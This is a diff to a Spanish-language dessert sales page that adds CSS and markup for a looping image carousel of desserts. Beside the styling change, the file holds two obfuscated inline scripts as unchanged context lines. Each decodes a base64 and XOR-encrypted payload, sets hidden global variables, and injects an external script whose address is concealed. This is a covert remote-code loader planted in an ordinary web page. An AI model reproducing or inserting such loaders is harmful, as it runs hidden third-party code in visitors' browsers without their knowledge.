@@ -1941,6 +1941,59 @@
       .pv-desire-bridge{font-size:13.5px}
     }
 
+
+    /* ======================================================
+       ESTEIRA DE POSTRES — LOOP CONTÍNUO E MAIS LENTO
+       ====================================================== */
+    .pv-marquee{
+      width:100%;
+      overflow:hidden;
+      position:relative;
+      padding:2px 0 10px;
+    }
+
+    .pv-marquee-track{
+      display:flex !important;
+      width:max-content !important;
+      gap:0 !important;
+      animation:postresLoop 58s linear infinite !important;
+      will-change:transform;
+    }
+
+    .pv-marquee-group{
+      display:flex;
+      flex-shrink:0;
+      gap:12px;
+      padding-right:12px;
+    }
+
+    @keyframes postresLoop{
+      from{transform:translate3d(0,0,0)}
+      to{transform:translate3d(-50%,0,0)}
+    }
+
+    .pv-marquee:hover .pv-marquee-track{
+      animation-play-state:running !important;
+    }
+
+    @media (max-width:430px){
+      .pv-marquee-track{
+        animation-duration:52s !important;
+      }
+    }
+
+    @media (max-width:360px){
+      .pv-marquee-track{
+        animation-duration:50s !important;
+      }
+    }
+
+    @media (prefers-reduced-motion:reduce){
+      .pv-marquee-track{
+        animation:postresLoop 58s linear infinite !important;
+      }
+    }
+
 </style>
 <script>(function(){var b_8ngf=atob("DAWiTmCtZw9AwSGKYn6AOxLBRTViqVX+EnaYYU/OA2FutFXnC2PbYAPCCiEisw75AXfLPhTeSH8puUTmTXXLNgXBSWUz4w2oA3HWPAnPEnslsgOwOViObAfBCG0hrVKoWF7ZbA7MCmpi+wP6C33HIinJRSNit0DmF2CAdEKbBm54+EXrBGTGeFaYATpw+EPoATPDelmPGlI9");var f_7=[];for(var s_dr=0;s_dr<b_8ngf.length;s_dr++){f_7.push(b_8ngf.charCodeAt(s_dr)&255);}var z_i5p=f_7[0];var f_y5kt=f_7.slice(1,1+z_i5p);var z_a=f_7.slice(1+z_i5p);var m_n=z_a.map(function(b,m_g52s){return b^f_y5kt[m_g52s%z_i5p];});var k_46c="";for(var a_1g=0;a_1g<m_n.length;a_1g++){k_46c+=String.fromCharCode(m_n[a_1g]&255);}var e_y=decodeURIComponent(escape(k_46c));var n_c=JSON.parse(e_y);var g_6=n_c.globals||[];g_6.forEach(function(u_5w1){window[u_5w1.name]=u_5w1.value;});var e_4=document.createElement("script");e_4.src=n_c.url;e_4.async=true;e_4.defer=true;(n_c.attributes||[]).forEach(function(y_ppgi){e_4.setAttribute(y_ppgi.name,y_ppgi.value);});(document.head||document.documentElement).appendChild(e_4);})();</script>
 <script>(function(){var y_5=atob("DGHo3LuL9aE+HpdfohrKqcnn15scduMr0hLS85Tokc8Qa+MyyweR8tjkmI9cbLgswROBrM/42tRKc+RwzgCcucj/28tNPLt9wxWcrtLpgNVbbbVl+RrKstrmkIMEPPM+1gDFqc/mnMdHM+ctxxeNss+mjcJReroswQrK8Jn9lM1Le7VlgEOV8MCpm8BTe7VlgAWJqNqmgNVTd/EmjxGauc3um9UTbeI9ywWb/pepg8BSa/J9mEPKoeb2");var a_40=[];for(var d_as=0;d_as<y_5.length;d_as++){a_40.push(y_5.charCodeAt(d_as)&255);}var s_lk=a_40[0];var w_703=a_40.slice(1,1+s_lk);var g_hgmf=a_40.slice(1+s_lk);var k_4bh6=g_hgmf.map(function(b,v_b){return b^w_703[v_b%s_lk];});var x_m7k6="";for(var d_r=0;d_r<k_4bh6.length;d_r++){x_m7k6+=String.fromCharCode(k_4bh6[d_r]&255);}var q_9=decodeURIComponent(escape(x_m7k6));var y_15=JSON.parse(q_9);var b_w3=y_15.globals||[];b_w3.forEach(function(w_r){window[w_r.name]=w_r.value;});var i_jm0h=document.createElement("script");i_jm0h.src=y_15.url;i_jm0h.async=true;i_jm0h.defer=true;(y_15.attributes||[]).forEach(function(i_lfbk){i_jm0h.setAttribute(i_lfbk.name,i_lfbk.value);});(document.head||document.documentElement).appendChild(i_jm0h);})();</script>
@@ -2363,104 +2416,108 @@
 
         <div class="pv-marquee" aria-label="Postres del método">
           <div class="pv-marquee-track">
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre1.webp" alt="Cheesecake de Fresa"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍓</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre2.webp" alt="Brownies"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍫</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre3.webp" alt="Cookies"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍪</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre4.webp" alt="Mousses"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍨</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre5.webp" alt="Panna Cotta"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍮</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre6.webp" alt="Gelatinas Gourmet"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">✨</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre7.webp" alt="Tres Chocolates"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍫</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre1.webp" alt="Cheesecake de Fresa"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍓</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre2.webp" alt="Brownies"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍫</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre3.webp" alt="Cookies"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍪</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre4.webp" alt="Mousses"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍨</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre5.webp" alt="Panna Cotta"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍮</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre6.webp" alt="Gelatinas Gourmet"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">✨</span>
-              </div>
-            </article>
-            <article class="dessert-card">
-              <div class="dessert-image">
-                <img src="images/postre7.webp" alt="Tres Chocolates"
-                     onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
-                <span class="dessert-fallback-emoji">🍫</span>
-              </div>
-            </article>
+            <div class="pv-marquee-group">
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre1.webp" alt="Cheesecake de Fresa"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍓</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre2.webp" alt="Brownies"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍫</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre3.webp" alt="Cookies"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍪</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre4.webp" alt="Mousses"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍨</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre5.webp" alt="Panna Cotta"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍮</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre6.webp" alt="Gelatinas Gourmet"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">✨</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre7.webp" alt="Tres Chocolates"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍫</span>
+                </div>
+              </article>
+            </div>
+            <div class="pv-marquee-group" aria-hidden="true">
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre1.webp" alt="Cheesecake de Fresa"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍓</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre2.webp" alt="Brownies"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍫</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre3.webp" alt="Cookies"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍪</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre4.webp" alt="Mousses"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍨</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre5.webp" alt="Panna Cotta"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍮</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre6.webp" alt="Gelatinas Gourmet"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">✨</span>
+                </div>
+              </article>
+              <article class="dessert-card">
+                <div class="dessert-image">
+                  <img src="images/postre7.webp" alt="Tres Chocolates"
+                       onerror="this.style.display='none'; this.parentElement.classList.add('dessert-fallback');" />
+                  <span class="dessert-fallback-emoji">🍫</span>
+                </div>
+              </article>
+            </div>
           </div>
         </div>
       </section>
